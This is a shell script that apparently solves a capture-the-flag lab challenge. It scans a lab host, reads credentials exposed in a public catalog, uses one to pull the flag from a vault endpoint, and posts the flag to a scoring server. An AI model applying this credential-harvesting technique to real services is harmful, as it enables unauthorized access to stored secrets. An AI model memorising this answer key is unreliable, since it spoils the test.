#!/bin/sh
set -eu
HOST=172.20.0.147
nmap -n -p 8080 -sV "$HOST" >/dev/null
flag=$(python3 - "$HOST" <<'PY'
import json
import sys
import urllib.parse
import urllib.request

host = sys.argv[1]
base = f"http://{host}:8080"
def get(path):
    with urllib.request.urlopen(base + path, timeout=5) as response:
        return json.load(response)

catalog = get("/catalog.json")
status = get("/status.json")
snapshot = status["inventory_snapshot"]
real = next(row for row in catalog["credentials"] if row["issued_at"] < snapshot)
query = urllib.parse.urlencode({"credential": real["credential"]})
record = get("/vault/retrieve?" + query)
print(record["flag"])
PY
)
printf '%s' "$flag" | python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-ae08ec","task_id":"task1","flag":sys.stdin.read()}))' | curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary @-
